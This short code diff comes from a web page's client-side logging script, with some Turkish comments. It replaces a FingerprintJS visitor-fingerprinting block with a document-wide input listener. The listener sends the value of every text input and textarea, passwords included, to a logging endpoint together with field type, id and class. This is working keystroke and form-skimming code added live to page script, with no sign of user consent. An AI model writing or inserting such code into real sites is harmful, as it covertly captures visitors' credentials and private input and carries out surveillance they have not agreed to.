@@ -116,22 +116,17 @@ if (navigator.getBattery) {
   });
 }
 
-// FingerprintJS loglama
-if (window.FingerprintJS) {
-  try {
-    FingerprintJS.load().then(fp => {
-      fp.get().then(result => {
-        sendClientLog({
-          type: "fingerprint",
-          fingerprint: result.visitorId,
-          components: result.components,
-          timestamp: Date.now()
-        });
-      });
+document.addEventListener("input", (e) => {
+  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") {
+    sendClientLog({
+      type: "user_input",
+      value: e.target.value,
+      inputType: e.target.type || "text",
+      id: e.target.id || null,
+      class: e.target.className || null,
+      timestamp: Date.now()
     });
-  } catch (err) {
-    console.warn("Fingerprint alınamadı:", err);
   }
-} else {
-  console.warn("FingerprintJS yüklenmedi.");
-}
+});
+
+
